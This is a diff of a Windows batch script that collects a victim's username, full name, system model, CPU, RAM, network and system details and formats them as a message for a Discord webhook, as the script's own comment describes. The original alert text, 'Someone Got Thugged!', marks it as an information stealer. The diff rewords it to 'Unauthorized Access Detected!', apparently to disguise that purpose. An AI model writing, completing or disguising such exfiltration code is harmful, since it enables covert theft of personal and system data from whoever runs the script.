@@ -65,9 +65,8 @@ for /f "tokens=*" %%a in ('wmic memorychip get capacity') do set "raminfo=%%a"
 for /f "tokens=*" %%a in ('wmic useraccount where name="%user_name%" get fullname') do set "userfullname=%%a"
 
 :: Format the message with better structure and additional info
-set "message=^
-{^
-  \"content\": \"**Alert: Someone Got Thugged! **\nHere is the detailed system information:\n\n**User:** %user_name%\n**Full Name:** %userfullname%\n**System Model:** %systemmodel%\n**CPU:** %cpuinfo%\n**RAM Capacity:** %raminfo%\n**Network Configuration:** %networkinfo%\n**System Information:** %sysinfo%\"^
+set "message={^
+  \"content\": \"**Alert: Unauthorized Access Detected!**\nHere is the detailed system information:\n\n**User:** %user_name%\n**Full Name:** %userfullname%\n**System Model:** %systemmodel%\n**CPU:** %cpuinfo%\n**RAM Capacity:** %raminfo%\n**Network Configuration:** %networkinfo%\n**System Information:** %sysinfo%\"^
 }"
 
 :: Send information to Discord webhook with better formatting and content type
